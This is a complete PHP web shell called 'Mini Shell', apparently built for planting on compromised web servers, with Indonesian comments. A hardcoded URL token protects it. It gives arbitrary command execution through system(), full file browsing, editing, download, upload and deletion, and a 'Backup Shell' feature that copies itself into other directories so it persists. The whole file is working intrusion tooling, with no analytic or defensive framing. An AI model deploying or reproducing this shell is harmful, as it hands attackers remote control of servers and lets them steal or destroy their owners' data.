<?php
ini_set("display_errors", 1);
error_reporting(E_ALL);

// LOGIN VIA TOKEN GET
$token = 'godzila';
if (!isset($_GET['pw']) || $_GET['pw'] !== $token) {
    header("HHTTP/1.1 403 Forbidden");
    exit;
}
$pw = urlencode($token); // untuk mempertahankan token di semua link

function h($s){return htmlspecialchars($s,ENT_QUOTES);}
function perms_color($path){
  $p = fileperms($path);
  $perm = substr(sprintf('%o', $p), -4);
  $color = is_writable($path) ? "#66bb66" : "#bb6666";
  return "<span style='color:$color'>$perm</span>";
}
$d = isset($_GET['d']) ? realpath($_GET['d']) : getcwd();
if (!$d || !is_dir($d)) $d = getcwd();
$c = isset($_POST['c']) ? $_POST['c'] : '';
$f = isset($_GET['f']) ? $_GET['f'] : '';
$a = isset($_GET['a']) ? $_GET['a'] : '';

echo "<html><head><title>Mini Shell</title><style>
body { background:#111;color:#ccc;font-family:monospace;font-size:13px;margin:0;padding:10px;}
.download-link, .delete-link { color:#448844; text-decoration:none; border-bottom:1px dashed #446644; }
.download-link:hover, .delete-link:hover { color:#66bb66; border-bottom:1px solid #66bb66; }
a { text-decoration:none; }
a:hover { text-decoration:underline; }
pre { background:#222; padding:10px; border:1px solid #444; overflow:auto; }
.scroll-box { max-height:400px; overflow:auto; border:1px solid #444; margin-bottom:1em; }
table { font-size:13px; width:100%; border-collapse:collapse; min-width:600px; }
th, td { padding:4px 8px; border:1px solid #444; white-space:nowrap; }
tr:hover { background:#1e1e1e; }
.folder-link { color:#ccaa33; font-weight:bold; }
.file-link { color:#aaa; }
form input[type=text], textarea {
  background:#222; border:1px solid #444; color:#ccc; padding:5px; width:80%;
}
form input[type=submit], input[type=file] {
  background:#333; border:1px solid #666; color:#ccc; padding:5px 10px;
}
</style></head><body>";

// Path Breadcrumb
echo "<h2>📁 Path: ";
$parts = explode('/', trim($d, '/'));
$build = '';
echo "<a href='?pw=$pw&d=/'>$  </a>";
foreach ($parts as $p) {
  $build .= "/$p";
  echo "/<a href='?pw=$pw&d=".urlencode($build)."'>".h($p)."</a>";
}
echo "</h2><hr>";

// Download
if($a == 'download' && is_file($f)){
  header("Content-Disposition: attachment; filename=\"".basename($f)."\"");
  header("Content-Type: application/octet-stream");
  readfile($f);
  exit;
}

// File Edit
if ($f && is_file($f) && $a !== 'del' && $a !== 'download') {
    if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['konten'])){
      $konten = get_magic_quotes_gpc() ? stripslashes($_POST['konten']) : $_POST['konten'];
      $s = @fopen($f, 'w');
      if($s){ fwrite($s, $konten); fclose($s); echo "<b>✅ File saved!</b><hr>"; }
      else { echo "<b>❌ Cannot save file!</b><hr>"; }
    }
    $content = h(file_get_contents($f));
    echo "<form method='POST'>";
    echo "<b>📝 Editing:</b> ".h($f)."<br>";
    echo "<textarea name='konten' rows='20'>".stripslashes($content)."</textarea><br>";
    echo "<input type='submit' value='Save'>";
    echo "</form><hr>";
  }  

// Rename File
if ($a == "rename" && $f && is_file($f)) {
    if (isset($_POST['newname'])) {
      $newname = dirname($f) . '/' . basename($_POST['newname']);
      if (@rename($f, $newname)) {
        echo "<b>✅ Renamed to ".h($newname)."</b><hr>";
        $f = $newname; // update path
      } else {
        echo "<b>❌ Failed to rename file</b><hr>";
      }
    }
    echo "<form method='POST'>";
    echo "<b>✏️ Rename:</b> ".h(basename($f))."<br>";
    echo "<input type='text' name='newname' value='".h(basename($f))."'>";
    echo "<input type='submit' value='Rename'>";
    echo "</form><hr>";
  }
  

// Command Executor
if($c != ''){
  echo "<h3>💻 Command:</h3><pre>";
  system($c);
  echo "</pre><hr>";
}

// File Delete
if($a == "del" && $f != ''){
  if(@unlink($f)){ echo "<b>✅ Deleted ".h($f)."</b><hr>"; }
  else { echo "<b>❌ Failed to delete ".h($f)."</b><hr>"; }
}

// Upload Handler
if(isset($_FILES['upload'])){
  $u = realpath($d).'/'.basename($_FILES['upload']['name']);
  if(move_uploaded_file($_FILES['upload']['tmp_name'], $u)){
    echo "<b>✅ Uploaded: ".h($u)."</b><hr>";
  } else {
    echo "<b>❌ Upload failed!</b><hr>";
  }
}

// Directory Listing
$dirs = array(); $files = array();
if($dh = @opendir($d)){
  while(($item = readdir($dh)) !== false){
    if($item == '.' || $item == '..') continue;
    $path = realpath($d.'/'.$item);
    if(is_dir($path)) $dirs[] = $item;
    else $files[] = $item;
  }
  closedir($dh);
}
sort($dirs); sort($files);

echo "<div class='scroll-box'><table>";
echo "<tr><th>Name</th><th>Size</th><th>Modified</th><th>Perm</th><th>Owner:Group</th><th>Action</th></tr>";

foreach($dirs as $file){
  $path = realpath($d.'/'.$file);
  $time = date("Y-m-d H:i:s", filemtime($path));
  $perm = perms_color($path);
  $ow = @posix_getpwuid(fileowner($path));
  $gr = @posix_getgrgid(filegroup($path));
  $own = $ow ? $ow['name'] : fileowner($path);
  $grp = $gr ? $gr['name'] : filegroup($path);
  echo "<tr>";
  echo "<td>[<a class='folder-link' href='?pw=$pw&d=".urlencode($path)."'>".h($file)."</a>]</td>";
  echo "<td></td><td>$time</td><td>$perm</td><td>$own:$grp</td><td>DIR</td>";
  echo "</tr>";
}

foreach($files as $file){
  $path = realpath($d.'/'.$file);
  $size = filesize($path);
  $time = date("Y-m-d H:i:s", filemtime($path));
  $perm = perms_color($path);
  $ow = @posix_getpwuid(fileowner($path));
  $gr = @posix_getgrgid(filegroup($path));
  $own = $ow ? $ow['name'] : fileowner($path);
  $grp = $gr ? $gr['name'] : filegroup($path);
  echo "<tr>";
  echo "<td><a class='file-link' href='?pw=$pw&f=".urlencode($path)."'>".h($file)."</a></td>";
  echo "<td>$size bytes</td><td>$time</td><td>$perm</td><td>$own:$grp</td>";
  echo "<td>
    <a class='download-link' href='?pw=$pw&f=".urlencode($path)."&a=download'>Download</a> |
    <a class='delete-link' href='?pw=$pw&f=".urlencode($path)."&a=del' onclick=\"return confirm('Delete ".h($file)."?')\">Delete</a> |
    <a href='?pw=$pw&f=".urlencode($path)."&a=rename'>Rename</a>
  </td>";
  echo "</tr>";
}
echo "</table></div><hr>";

// Upload
echo "<form method='POST' enctype='multipart/form-data'>
<b>📥 Upload file:</b><br>
<input type='file' name='upload'>
<input type='submit' value='Upload'>
</form><hr>";

// Command
echo "<form method=POST>
<b>💬 Execute Command:</b><br>
<input type='text' name='c' autofocus>
<input type='submit' value='Run'>
</form><hr>";

// Trigger Backup
echo "<form method='POST' style='text-align:center; margin-top:10px;'>";
echo "<input type='hidden' name='pw' value='$pw'>";
echo "<input type='submit' name='backup_trigger' value='📦 Backup Shell'>";
echo "</form><hr>";
// Trigger backup form
if (isset($_POST['backup_trigger'])) {
    echo "<div style='text-align:center;margin-top:10px;'>";
    echo "<form method='post' style='display:inline-block;'>";
    echo "<input type='hidden' name='pw' value='$pw'>";
    echo "<input type='text' name='backup_name' placeholder='Nama File'> ";
    echo "<input type='submit' name='do_backup' value='✅ OK'>";
    echo "</form>";
    echo "</div><hr>";
}

// Lakukan backup
if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $src = $_SERVER['SCRIPT_FILENAME'];
    $real_path = realpath($d); // direktori aktif
    $dst = $real_path . '/' . basename($_POST['backup_name']);
    if (@copy($src, $dst)) {
        echo "<div style='color:#66bb66;text-align:center;'>✔️ Backup berhasil: <code>" . h(basename($dst)) . "</code></div><hr>";
    } else {
        echo "<div style='color:#ff4444;text-align:center;'>❌ Gagal backup ke <code>" . h(basename($dst)) . "</code></div><hr>";
    }
}


echo "</body></html>";
